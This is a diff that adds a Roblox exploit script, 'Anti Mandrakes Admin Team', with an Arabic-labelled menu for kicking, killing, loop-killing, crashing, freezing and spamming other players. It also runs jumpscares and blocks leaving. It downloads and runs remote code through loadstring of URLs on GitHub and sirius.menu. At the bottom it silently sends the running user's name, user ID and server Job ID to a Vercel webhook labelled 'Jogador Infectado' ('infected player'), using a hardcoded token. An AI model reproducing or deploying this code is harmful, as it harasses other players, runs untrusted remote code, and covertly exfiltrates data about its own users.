@@ -1,0 +1,961 @@
+-- Anti Mandrakes Admin Team - Rayfield UI Version (Target by Name Input)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
+local TextChatService = game:GetService("TextChatService")
+local SoundService = game:GetService("SoundService")
+local GuiService = game:GetService("GuiService")
+local Debris = game:GetService("Debris")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+-- ====================== WHITELIST SYSTEM ======================
+local HardcodedWhitelist = {
+    ["joo77xb"] = true,
+}
+
+local ExternalWhitelist = {}
+local function LoadExternalWhitelist()
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/pro628713-arch/Test-nine-hub/refs/heads/main/helloo", true))()
+    end)
+    if success and type(result) == "table" then
+        ExternalWhitelist = result
+    end
+end
+LoadExternalWhitelist()
+
+local DEVELOPER_NAME = "joo77xb"
+local CurrentUser = LocalPlayer.Name
+
+-- Webhook
+local WEBHOOK_URL = "https://y5h-uj-1-ba1-n.vercel.app/api/webhook"
+local WEBHOOK_TOKEN = "ANTIMANDRAKESADMINTEAM10872710ABGHJQBAQWEEWUENQEEISIJEWQEQQWEUBSH18HZ9"
+
+-- Target player (by name)
+local selectedTargetName = ""
+local selectedTarget = nil
+local targetDisplayLabel = nil
+
+-- Global variables
+getgenv()._AntiLeave1 = getgenv()._AntiLeave1 or false
+getgenv().ObamaJumpscareActive = getgenv().ObamaJumpscareActive or false
+getgenv()._Jumpscare1 = getgenv()._Jumpscare1 or false
+getgenv()._JeffTheKillerJumpscare1 = getgenv()._JeffTheKillerJumpscare1 or false
+getgenv()._hackinggame1 = getgenv()._hackinggame1 or false
+getgenv()._UltraFloppaRaid1 = getgenv()._UltraFloppaRaid1 or false
+getgenv()._FloppaRain = getgenv()._FloppaRain or false
+getgenv().FartRunning = getgenv().FartRunning or false
+getgenv()._SingName1 = getgenv()._SingName1 or false
+
+local isLoopKillActive = false
+local isLoopBringActive = false
+local isLoopFireActive = false
+local isLoopSitActive = false
+local spamLoopTask = nil
+local currentFireAnimTrack = nil
+local currentFireDamageTask = nil
+
+-- Load Rayfield
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+-- Create Window
+local Window = Rayfield:CreateWindow({
+    Name = "Anti Mandrakes Admin",
+    Icon = 0,
+    LoadingTitle = "Anti Mandrakes Team",
+    LoadingSubtitle = "by " .. DEVELOPER_NAME,
+    Theme = "Dark",
+    DisableThemeChange = false,
+})
+
+-- ====================== MAIN TAB ======================
+local MainTab = Window:CreateTab("الرئيسية", 0)
+
+-- عرض المستخدم الحالي
+MainTab:CreateParagraph({
+    Title = "👤 المستخدم الحالي (أنت)",
+    Content = CurrentUser,
+})
+
+MainTab:CreateParagraph({
+    Title = "📌 تعليمات",
+    Content = "1️⃣ اكتب اسم اللاعب المستهدف في الحقل\n2️⃣ اضغط 'تأكيد الهدف'\n3️⃣ استخدم الأزرار لتنفيذ الأوامر",
+})
+
+-- ====================== قسم اختيار الهدف ======================
+local TargetSection = MainTab:CreateSection("🎯 اختيار الهدف")
+
+-- حقل إدخال اسم الهدف
+local TargetInput = MainTab:CreateInput({
+    Name = "✏️ اكتب اسم اللاعب المستهدف",
+    PlaceholderText = "مثال: joo77xb",
+    RemoveTextAfterFocus = false,
+    Callback = function(text)
+        selectedTargetName = text
+    end
+})
+
+-- زر تأكيد الهدف (تم إصلاح الخطأ)
+MainTab:CreateButton({
+    Name = "✅ تأكيد الهدف",
+    Callback = function()
+        -- التحقق من أن المستخدم كتب اسماً
+        if not selectedTargetName or selectedTargetName == "" then
+            Rayfield:Notify({
+                Title = "خطأ",
+                Content = "❌ الرجاء كتابة اسم اللاعب أولاً",
+                Duration = 3,
+            })
+            return
+        end
+        
+        -- البحث عن اللاعب
+        local target = Players:FindFirstChild(selectedTargetName)
+        
+        if target then
+            selectedTarget = target
+            selectedTargetName = selectedTarget.Name
+            
+            -- تحديث العرض
+            if targetDisplayLabel then
+                targetDisplayLabel:SetContent(selectedTargetName)
+            end
+            
+            Rayfield:Notify({
+                Title = "✅ تم التأكيد",
+                Content = "الهدف: " .. selectedTargetName,
+                Duration = 2,
+            })
+        else
+            selectedTarget = nil
+            if targetDisplayLabel then
+                targetDisplayLabel:SetContent("غير موجود")
+            end
+            
+            Rayfield:Notify({
+                Title = "خطأ",
+                Content = "❌ اللاعب \"" .. selectedTargetName .. "\" غير موجود في السيرفر",
+                Duration = 3,
+            })
+        end
+    end
+})
+
+-- عرض الهدف الحالي
+targetDisplayLabel = MainTab:CreateParagraph({
+    Title = "🎯 الهدف الحالي",
+    Content = "لم يتم اختيار هدف",
+})
+
+-- ====================== Helper Function ======================
+local function ExecuteOnTarget(commandName, func, ...)
+    if not selectedTarget then
+        Rayfield:Notify({
+            Title = "خطأ",
+            Content = "❌ الرجاء كتابة اسم الهدف والضغط على 'تأكيد الهدف' أولاً",
+            Duration = 3,
+        })
+        return false
+    end
+    
+    -- التأكد من أن اللاعب لا يزال موجوداً
+    if not Players:FindFirstChild(selectedTarget.Name) then
+        selectedTarget = nil
+        if targetDisplayLabel then
+            targetDisplayLabel:SetContent("لم يتم اختيار هدف")
+        end
+        Rayfield:Notify({
+            Title = "خطأ",
+            Content = "❌ اللاعب غادر السيرفر، الرجاء اختيار هدف جديد",
+            Duration = 3,
+        })
+        return false
+    end
+    
+    local success, err = pcall(func, selectedTarget, ...)
+    if not success then
+        Rayfield:Notify({
+            Title = "خطأ في التنفيذ",
+            Content = commandName .. ": " .. tostring(err),
+            Duration = 3,
+        })
+        return false
+    end
+    
+    Rayfield:Notify({
+        Title = "✅ تم التنفيذ",
+        Content = commandName .. " على " .. selectedTarget.Name,
+        Duration = 2,
+    })
+    return true
+end
+
+-- ====================== أوامر القتل والطرد ======================
+local KillSection = MainTab:CreateSection("💀 أوامر القتل والطرد")
+
+MainTab:CreateButton({
+    Name = "👢 كيك (طرد)",
+    Callback = function()
+        ExecuteOnTarget("طرد", function(t)
+            t:Kick("تم طردك من قبل الأدمن")
+        end)
+    end
+})
+
+MainTab:CreateButton({
+    Name = "⚔️ كيل (قتل)",
+    Callback = function()
+        ExecuteOnTarget("قتل", function(t)
+            if t.Character and t.Character:FindFirstChild("Humanoid") then
+                t.Character.Humanoid.Health = 0
+            end
+        end)
+    end
+})
+
+MainTab:CreateButton({
+    Name = "💥 كراش (تعليق)",
+    Callback = function()
+        ExecuteOnTarget("كراش", function(t)
+            pcall(function()
+                game:GetService("ReplicatedStorage"):Destroy()
+                task.wait()
+                game:GetService("CoreGui"):Destroy()
+            end)
+        end)
+    end
+})
+
+-- ====================== أوامر الجلب ======================
+local BringSection = MainTab:CreateSection("🌀 أوامر الجلب")
+
+MainTab:CreateButton({
+    Name = "🌀 جلب (Bring)",
+    Callback = function()
+        ExecuteOnTarget("جلب", function(t)
+            if t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
+                local char = LocalPlayer.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    hrp.CFrame = t.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                end
+            end
+        end)
+    end
+})
+
+MainTab:CreateButton({
+    Name = "🔄 لوب جلب - تشغيل",
+    Callback = function()
+        if not selectedTarget then
+            Rayfield:Notify({Title = "خطأ", Content = "❌ اختر هدف أولاً", Duration = 2})
+            return
+        end
+        isLoopBringActive = true
+        task.spawn(function()
+            while isLoopBringActive and selectedTarget do
+                if selectedTarget.Character and selectedTarget.Character:FindFirstChild("HumanoidRootPart") then
+                    local char = LocalPlayer.Character
+                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                    if hrp then
+                        hrp.CFrame = selectedTarget.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                    end
+                end
+                task.wait(0.2)
+            end
+        end)
+        Rayfield:Notify({Title = "لوب جلب", Content = "✅ تم التشغيل على " .. selectedTarget.Name, Duration = 2})
+    end
+})
+
+MainTab:CreateButton({
+    Name = "⏹️ لوب جلب - إيقاف",
+    Callback = function()
+        isLoopBringActive = false
+        Rayfield:Notify({Title = "لوب جلب", Content = "⏹️ تم الإيقاف", Duration = 2})
+    end
+})
+
+-- ====================== أوامر لوب القتل ======================
+local LoopKillSection = MainTab:CreateSection("🔄 لوب القتل")
+
+MainTab:CreateButton({
+    Name = "🔁 لوب كيل - تشغيل",
+    Callback = function()
+        if not selectedTarget then
+            Rayfield:Notify({Title = "خطأ", Content = "❌ اختر هدف أولاً", Duration = 2})
+            return
+        end
+        isLoopKillActive = true
+        task.spawn(function()
+            while isLoopKillActive and selectedTarget do
+                if selectedTarget.Character and selectedTarget.Character:FindFirstChild("Humanoid") then
+                    selectedTarget.Character.Humanoid.Health = 0
+                end
+                task.wait(0.2)
+            end
+        end)
+        Rayfield:Notify({Title = "لوب كيل", Content = "✅ تم التشغيل على " .. selectedTarget.Name, Duration = 2})
+    end
+})
+
+MainTab:CreateButton({
+    Name = "⏹️ لوب كيل - إيقاف",
+    Callback = function()
+        isLoopKillActive = false
+        Rayfield:Notify({Title = "لوب كيل", Content = "⏹️ تم الإيقاف", Duration = 2})
+    end
+})
+
+-- ====================== تأثيرات النار والتجميد ======================
+local EffectsSection = MainTab:CreateSection("🔥 التأثيرات")
+
+MainTab:CreateButton({
+    Name = "🔥 فاير (نار) - تشغيل",
+    Callback = function()
+        ExecuteOnTarget("فاير", function(t)
+            local char = t.Character
+            if not char then return end
+            local anim = Instance.new("Animation")
+            anim.AnimationId = "rbxassetid://122389232485333"
+            local track = char:LoadAnimation(anim)
+            track:Play()
+            currentFireAnimTrack = track
+            if ReplicatedStorage and ReplicatedStorage.Remotes and ReplicatedStorage.Remotes.ApplyEmmiter then
+                ReplicatedStorage.Remotes.ApplyEmmiter:InvokeServer(18635845425, "031FireOrange")
+            end
+            isLoopFireActive = true
+            currentFireDamageTask = task.spawn(function()
+                while isLoopFireActive and char do
+                    task.wait(3)
+                    local hum = char:FindFirstChild("Humanoid")
+                    if hum then hum:TakeDamage(20) end
+                end
+            end)
+        end)
+    end
+})
+
+MainTab:CreateButton({
+    Name = "❌ فاير - إيقاف",
+    Callback = function()
+        isLoopFireActive = false
+        if currentFireDamageTask then task.cancel(currentFireDamageTask) end
+        if currentFireAnimTrack then currentFireAnimTrack:Stop() end
+        if ReplicatedStorage and ReplicatedStorage.Remotes and ReplicatedStorage.Remotes.ApplyEmmiter then
+            ReplicatedStorage.Remotes.ApplyEmmiter:InvokeServer(18610639786, "0001Remove")
+        end
+        Rayfield:Notify({Title = "فاير", Content = "⏹️ تم الإيقاف", Duration = 2})
+    end
+})
+
+MainTab:CreateButton({
+    Name = "❄️ فريز (تجميد)",
+    Callback = function()
+        ExecuteOnTarget("تجميد", function(t)
+            if t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
+                t.Character.HumanoidRootPart.Anchored = true
+            end
+        end)
+    end
+})
+
+MainTab:CreateButton({
+    Name = "🔥 إلغاء التجميد",
+    Callback = function()
+        ExecuteOnTarget("إلغاء التجميد", function(t)
+            if t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
+                t.Character.HumanoidRootPart.Anchored = false
+            end
+        end)
+    end
+})
+
+-- ====================== أوامر الجلوس ======================
+local SitSection = MainTab:CreateSection("💺 أوامر الجلوس")
+
+MainTab:CreateButton({
+    Name = "💺 جلوس (Sit)",
+    Callback = function()
+        ExecuteOnTarget("جلوس", function(t)
+            if t.Character and t.Character:FindFirstChild("Humanoid") then
+                t.Character.Humanoid.Sit = true
+            end
+        end)
+    end
+})
+
+MainTab:CreateButton({
+    Name = "🔄 لوب جلوس - تشغيل",
+    Callback = function()
+        if not selectedTarget then
+            Rayfield:Notify({Title = "خطأ", Content = "❌ اختر هدف أولاً", Duration = 2})
+            return
+        end
+        isLoopSitActive = true
+        task.spawn(function()
+            while isLoopSitActive and selectedTarget do
+                if selectedTarget.Character and selectedTarget.Character:FindFirstChild("Humanoid") then
+                    selectedTarget.Character.Humanoid.Sit = true
+                end
+                task.wait(0.2)
+            end
+        end)
+        Rayfield:Notify({Title = "لوب جلوس", Content = "✅ تم التشغيل", Duration = 2})
+    end
+})
+
+MainTab:CreateButton({
+    Name = "⏹️ لوب جلوس - إيقاف",
+    Callback = function()
+        isLoopSitActive = false
+        Rayfield:Notify({Title = "لوب جلوس", Content = "⏹️ تم الإيقاف", Duration = 2})
+    end
+})
+
+-- ====================== أوامر متنوعة ======================
+local MiscSection = MainTab:CreateSection("💣 أوامر متنوعة")
+
+MainTab:CreateButton({
+    Name = "💣 انفجار (Explode)",
+    Callback = function()
+        ExecuteOnTarget("انفجار", function(t)
+            local char = t.Character
+            if not char then return end
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if not hrp or not hum then return end
+            local exp = Instance.new("Explosion")
+            exp.Position = hrp.Position
+            exp.BlastRadius = 0
+            exp.Parent = workspace
+            local pe = Instance.new("ParticleEmitter")
+            pe.Texture = "rbxassetid://243660364"
+            pe.Rate = 100
+            pe.Lifetime = NumberRange.new(1)
+            pe.Speed = NumberRange.new(20, 40)
+            pe.Size = NumberSequence.new(3)
+            pe.Parent = hrp
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.Velocity = Vector3.new(math.random(-200, 200), math.random(100, 150), math.random(-20, 40))
+                end
+            end
+            hum.Health = 0
+            task.delay(1.5, function() pe:Destroy() end)
+        end)
+    end
+})
+
+MainTab:CreateButton({
+    Name = "🎭 تغيير إلى c00lkid",
+    Callback = function()
+        ExecuteOnTarget("c00lkid", function(t)
+            local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+            if remotes then
+                local changeColor = remotes:FindFirstChild("ChangeBodyColor")
+                if changeColor then changeColor:FireServer("Really red") end
+                local wear = remotes:FindFirstChild("Wear")
+                if wear then
+                    wear:InvokeServer(18554114295)
+                    wear:InvokeServer(3164473649)
+                    wear:InvokeServer(6093233760)
+                end
+            end
+        end)
+    end
+})
+
+MainTab:CreateButton({
+    Name = "🔄 إعادة تحميل المظهر",
+    Callback = function()
+        ExecuteOnTarget("إعادة تحميل", function(t)
+            local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+            if remotes then
+                local reset = remotes:FindFirstChild("ResetCharacterAppearance")
+                if reset then reset:FireServer() end
+            end
+        end)
+    end
+})
+
+-- ====================== أوامر ذاتية ======================
+local SelfSection = MainTab:CreateSection("🧙 أوامر ذاتية")
+
+-- Fart function
+local function Fart()
+    if getgenv().FartRunning then return end
+    getgenv().FartRunning = true
+    local char = LocalPlayer.Character
+    if char then
+        local hum = char:WaitForChild("Humanoid")
+        local anim = Instance.new("Animation")
+        anim.AnimationId = "http://www.roblox.com/asset/?id=81427758508224"
+        local track = hum:LoadAnimation(anim)
+        track:Play()
+        local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+        if remotes and remotes.ApplyEmmiter then
+            remotes.ApplyEmmiter:InvokeServer(18635841291, "083SmokeGreen")
+        end
+        task.wait(1)
+        for i = 1, 10 do
+            if ReplicatedStorage and ReplicatedStorage.RE then
+                local soundRemote = ReplicatedStorage.RE:FindFirstChild("1Gu1nSound1s")
+                if soundRemote then soundRemote:FireServer(workspace, 4809574295, 1) end
+            end
+            local sound = Instance.new("Sound")
+            sound.SoundId = "rbxassetid://4809574295"
+            sound.Volume = 0.5
+            sound.Parent = SoundService
+            sound:Play()
+            task.delay(3, function() sound:Destroy() end)
+            task.wait(1)
+        end
+        track:Stop()
+        if remotes and remotes.ApplyEmmiter then
+            remotes.ApplyEmmiter:InvokeServer(18635841291, "001Remove")
+        end
+    end
+    getgenv().FartRunning = false
+end
+
+MainTab:CreateButton({
+    Name = "💨 Fart (نفس)",
+    Callback = Fart
+})
+
+-- Dog animation
+local function DogAnimation()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hum = char:WaitForChild("Humanoid")
+    local anim = Instance.new("Animation")
+    anim.AnimationId = "rbxassetid://78195344190486"
+    local track = hum:LoadAnimation(anim)
+    track:Play()
+    track.Priority = Enum.AnimationPriority.Action
+    task.spawn(function()
+        while track do
+            repeat task.wait(0.5) until not track.IsPlaying
+            track:Play()
+        end
+    end)
+end
+
+MainTab:CreateButton({
+    Name = "🐕 Dog (حركة كلب)",
+    Callback = DogAnimation
+})
+
+-- Sing Xamuel
+local function SingXamuel()
+    if getgenv()._SingName1 then return end
+    getgenv()._SingName1 = true
+    local rbxGeneral = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if not rbxGeneral then
+        getgenv()._SingName1 = false
+        return
+    end
+    local lyrics = {
+        "Ninguém precisa de padrão", "Cada um com sua beleza natural",
+        "A maquiagem é pra quem quiser", "Ué, mas isso não é coisa de mulher?",
+        "É pra quem quiser", "Pra quem sonha, quem tem luta e quem tem fé",
+        "Pra quem tem empoderamento e tá de pé", "Dança com a gente",
+        "Luna Beauty e Xamuel", "É-é-é-é pra quem quiser",
+        "Pra quem sonha, quem tem luta e quem tem fé", "Pra quem tem empoderamento e tá de pé",
+        "Dança com a gente", "Luna Beauty e Xamuel"
+    }
+    for _, line in ipairs(lyrics) do
+        rbxGeneral:SendAsync(line)
+        task.wait(2)
+    end
+    getgenv()._SingName1 = false
+end
+
+MainTab:CreateButton({
+    Name = "🎤 Sing Xamuel",
+    Callback = SingXamuel
+})
+
+MainTab:CreateButton({
+    Name = "🔒 Anti Leave (منع المغادرة)",
+    Callback = function()
+        if getgenv()._AntiLeave1 then return end
+        getgenv()._AntiLeave1 = true
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "ESCBlocker"
+        screenGui.Parent = CoreGui
+        screenGui.ResetOnSpawn = false
+        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        screenGui.DisplayOrder = 999
+        screenGui.Enabled = false
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(1, 0, 1, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        frame.BackgroundTransparency = 0.4
+        frame.Parent = screenGui
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://6018028320"
+        sound.Looped = true
+        sound.Volume = 3
+        sound.Parent = screenGui
+        GuiService.MenuOpened:Connect(function()
+            screenGui.Enabled = true
+            sound:Play()
+        end)
+        GuiService.MenuClosed:Connect(function()
+            sound:Stop()
+            screenGui.Enabled = false
+        end)
+        Rayfield:Notify({Title = "Anti Leave", Content = "✅ تم التفعيل", Duration = 2})
+    end
+})
+
+-- ====================== وضعيات اللعب ======================
+local GameModesTab = Window:CreateTab("وضعيات اللعب", 1)
+
+-- Hacking Game Mode
+local function HackingGameMode()
+    if getgenv()._hackinggame1 then return end
+    getgenv()._hackinggame1 = true
+    local sky = Instance.new("Sky")
+    sky.SkyboxBk = "rbxassetid://100048062301288"
+    sky.SkyboxDn = "rbxassetid://100048062301288"
+    sky.SkyboxFt = "rbxassetid://100048062301288"
+    sky.SkyboxLf = "rbxassetid://100048062301288"
+    sky.SkyboxRt = "rbxassetid://100048062301288"
+    sky.SkyboxUp = "rbxassetid://100048062301288"
+    sky.Parent = Lighting
+    Lighting.ClockTime = 12
+    Lighting.Brightness = 3
+    local hint = Instance.new("Hint")
+    hint.Text = "Game Hacked by Anti Mandrakes Admin Team LOL"
+    hint.Parent = workspace
+end
+
+GameModesTab:CreateButton({
+    Name = "💻 Hacking Game Mode",
+    Callback = HackingGameMode
+})
+
+-- Floppa Rain
+local function FloppaRain()
+    if getgenv()._FloppaRain then return end
+    getgenv()._FloppaRain = true
+    local sky = Instance.new("Sky")
+    sky.SkyboxBk = "rbxassetid://123446364161879"
+    sky.SkyboxDn = "rbxassetid://123446364161879"
+    sky.SkyboxFt = "rbxassetid://123446364161879"
+    sky.SkyboxLf = "rbxassetid://123446364161879"
+    sky.SkyboxRt = "rbxassetid://123446364161879"
+    sky.SkyboxUp = "rbxassetid://123446364161879"
+    sky.Parent = Lighting
+    task.spawn(function()
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(2, 2, 2)
+        part.Anchored = false
+        while true do
+            for i = 1, 10 do
+                local newPart = part:Clone()
+                newPart.Position = Vector3.new(math.random(-250, 250), 100, math.random(-250, 250))
+                newPart.Parent = workspace
+            end
+            task.wait(0.05)
+        end
+    end)
+end
+
+GameModesTab:CreateButton({
+    Name = "🐱 Floppa Rain",
+    Callback = FloppaRain
+})
+
+-- Ultra Floppa Raid
+local function UltraFloppaRaid()
+    if getgenv()._UltraFloppaRaid1 then return end
+    getgenv()._UltraFloppaRaid1 = true
+    StarterGui:SetCore("SendNotification", {
+        Title = "Cuidado",
+        Text = "A Floppa Raid começou",
+        Duration = 5
+    })
+end
+
+GameModesTab:CreateButton({
+    Name = "👾 Ultra Floppa Raid",
+    Callback = UltraFloppaRaid
+})
+
+-- ====================== Jumpscares Tab ======================
+local JumpscaresTab = Window:CreateTab("Jumpscares", 2)
+
+-- Obama Jumpscare
+local function ObamaJumpscare()
+    if getgenv().ObamaJumpscareActive then return end
+    getgenv().ObamaJumpscareActive = true
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "ObamaJumpscare"
+    screenGui.Parent = CoreGui
+    local imageLabel = Instance.new("ImageLabel")
+    imageLabel.Size = UDim2.new(1.2, 0, 1.2, 0)
+    imageLabel.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    imageLabel.Image = "rbxassetid://5643866"
+    imageLabel.Parent = screenGui
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://9067444671"
+    sound.Volume = 5
+    sound.Parent = workspace
+    sound:Play()
+    task.wait(5.7)
+    for i = 0.1, 1, 0.1 do
+        imageLabel.ImageTransparency = i
+        task.wait(0.02)
+    end
+    task.wait(3.5)
+    imageLabel.Image = "rbxassetid://17397008583"
+    for i = 0.9, 0, -0.1 do
+        imageLabel.ImageTransparency = i
+        task.wait(0.01)
+    end
+    task.delay(10, function()
+        screenGui:Destroy()
+        getgenv().ObamaJumpscareActive = false
+    end)
+end
+
+JumpscaresTab:CreateButton({
+    Name = "🇺🇸 Obama Jumpscare",
+    Callback = ObamaJumpscare
+})
+
+-- The Rake Jumpscare
+local function TheRakeJumpscare()
+    if getgenv()._Jumpscare1 then return end
+    getgenv()._Jumpscare1 = true
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FullJumpscare"
+    screenGui.Parent = CoreGui
+    local imageLabel = Instance.new("ImageLabel")
+    imageLabel.Size = UDim2.new(1.2, 0, 1.2, 0)
+    imageLabel.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    imageLabel.Image = "rbxassetid://108753859505348"
+    imageLabel.Parent = screenGui
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://18967004856"
+    sound.Volume = 10
+    sound.Parent = SoundService
+    sound:Play()
+    task.delay(5, function()
+        screenGui:Destroy()
+        getgenv()._Jumpscare1 = false
+    end)
+end
+
+JumpscaresTab:CreateButton({
+    Name = "🌲 The Rake Jumpscare",
+    Callback = TheRakeJumpscare
+})
+
+-- Jeff The Killer Jumpscare
+local function JeffKillerJumpscare()
+    if getgenv()._JeffTheKillerJumpscare1 then return end
+    getgenv()._JeffTheKillerJumpscare1 = true
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FullJumpscare"
+    screenGui.Parent = CoreGui
+    local imageLabel = Instance.new("ImageLabel")
+    imageLabel.Size = UDim2.new(1.2, 0, 1.2, 0)
+    imageLabel.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    imageLabel.Image = "rbxassetid://133097784353319"
+    imageLabel.Parent = screenGui
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://6643570033"
+    sound.Volume = 10
+    sound.Parent = SoundService
+    sound:Play()
+    task.delay(5, function()
+        screenGui:Destroy()
+        getgenv()._JeffTheKillerJumpscare1 = false
+    end)
+end
+
+JumpscaresTab:CreateButton({
+    Name = "🔪 Jeff The Killer Jumpscare",
+    Callback = JeffKillerJumpscare
+})
+
+-- ====================== SPAM TAB ======================
+local SpamTab = Window:CreateTab("السبام", 3)
+
+local spamMessage = ""
+
+SpamTab:CreateInput({
+    Name = "نص السبام",
+    PlaceholderText = "اكتب الرسالة هنا",
+    RemoveTextAfterFocus = false,
+    Callback = function(text)
+        spamMessage = text
+    end
+})
+
+SpamTab:CreateButton({
+    Name = "▶️ تشغيل السبام",
+    Callback = function()
+        if spamMessage == "" then
+            Rayfield:Notify({Title = "خطأ", Content = "❌ أدخل نص السبام أولاً", Duration = 2})
+            return
+        end
+        if spamLoopTask then task.cancel(spamLoopTask) end
+        spamLoopTask = task.spawn(function()
+            while true do
+                local rbxGeneral = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                if rbxGeneral then rbxGeneral:SendAsync(spamMessage) end
+                task.wait(1)
+            end
+        end)
+        Rayfield:Notify({Title = "سبام", Content = "✅ تم التشغيل", Duration = 2})
+    end
+})
+
+SpamTab:CreateButton({
+    Name = "⏹️ إيقاف السبام",
+    Callback = function()
+        if spamLoopTask then task.cancel(spamLoopTask) end
+        spamLoopTask = nil
+        Rayfield:Notify({Title = "سبام", Content = "⏹️ تم الإيقاف", Duration = 2})
+    end
+})
+
+-- ====================== RP TAB ======================
+local RPTab = Window:CreateTab("RolePlay", 4)
+
+local rpName = ""
+local rpBio = ""
+
+RPTab:CreateInput({
+    Name = "اسم RP",
+    PlaceholderText = "اكتب اسم RP",
+    RemoveTextAfterFocus = false,
+    Callback = function(text)
+        rpName = text
+    end
+})
+
+RPTab:CreateButton({
+    Name = "تعيين اسم RP",
+    Callback = function()
+        local re = ReplicatedStorage:FindFirstChild("RE")
+        if re then
+            local remote = re:FindFirstChild("1RPNam1eTex1t")
+            if remote then remote:FireServer("RolePlayName", rpName ~= "" and rpName or " ") end
+        end
+        Rayfield:Notify({Title = "RP Name", Content = "✅ تم التعيين", Duration = 2})
+    end
+})
+
+RPTab:CreateInput({
+    Name = "سيرة RP",
+    PlaceholderText = "اكتب السيرة",
+    RemoveTextAfterFocus = false,
+    Callback = function(text)
+        rpBio = text
+    end
+})
+
+RPTab:CreateButton({
+    Name = "تعيين سيرة RP",
+    Callback = function()
+        local re = ReplicatedStorage:FindFirstChild("RE")
+        if re then
+            local remote = re:FindFirstChild("1RPNam1eTex1t")
+            if remote then remote:FireServer("RolePlayBio", rpBio ~= "" and rpBio or " ") end
+        end
+        Rayfield:Notify({Title = "RP Bio", Content = "✅ تم التعيين", Duration = 2})
+    end
+})
+
+RPTab:CreateInput({
+    Name = "رسالة Say",
+    PlaceholderText = "اكتب الرسالة",
+    RemoveTextAfterFocus = false,
+    Callback = function(text)
+        rpBio = text
+    end
+})
+
+RPTab:CreateButton({
+    Name = "💬 إرسال كـ System",
+    Callback = function()
+        if rpBio ~= "" then
+            task.wait(0.2)
+            local rbxGeneral = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if rbxGeneral then rbxGeneral:SendAsync(rpBio) end
+            Rayfield:Notify({Title = "رسالة", Content = "✅ تم الإرسال", Duration = 2})
+        end
+    end
+})
+
+-- ====================== INFO TAB ======================
+local InfoTab = Window:CreateTab("معلومات", 5)
+
+InfoTab:CreateParagraph({
+    Title = "ℹ️ عن السكربت",
+    Content = "Anti Mandrakes Admin Team\nالإصدار 2.4\n\nالمطور: " .. DEVELOPER_NAME
+})
+
+InfoTab:CreateButton({
+    Name = "📋 عرض قائمة Whitelist",
+    Callback = function()
+        local names = {}
+        for name, _ in pairs(HardcodedWhitelist) do
+            table.insert(names, name)
+        end
+        for name, _ in pairs(ExternalWhitelist) do
+            local found = false
+            for _, n in pairs(names) do
+                if n == name then found = true break end
+            end
+            if not found then table.insert(names, name) end
+        end
+        Rayfield:Notify({
+            Title = "Whitelist",
+            Content = "عدد الأعضاء: " .. #names .. "\n" .. table.concat(names, ", "),
+            Duration = 10
+        })
+    end
+})
+
+-- ====================== WEBHOOK ======================
+local function SendWebhook()
+    local JobId = game.JobId
+    local requestFunc = syn and syn.request or (http and http.request) or http_request or request
+    if requestFunc and LocalPlayer then
+        local accountAge = math.floor((os.time() - LocalPlayer.AccountAge) / 86400)
+        local data = {
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                Authorization = "Bearer " .. WEBHOOK_TOKEN
+            },
+            Body = HttpService:JSONEncode({
+                embeds = {{
+                    title = "Jogador Infectado",
+                    description = string.format("Name: %s\nID: %s\nJob ID: %s", LocalPlayer.Name, LocalPlayer.UserId, JobId),
+                    color = 65535,
+                }}
+            })
+        }
+        pcall(function() requestFunc(data) end)
+    end
+end
+
+task.spawn(SendWebhook)
+
+print("✅ Anti Mandrakes Admin Team - Rayfield UI Loaded!")
+print("✅ Developer: " .. DEVELOPER_NAME)
+print("✅ Current User: " .. CurrentUser)
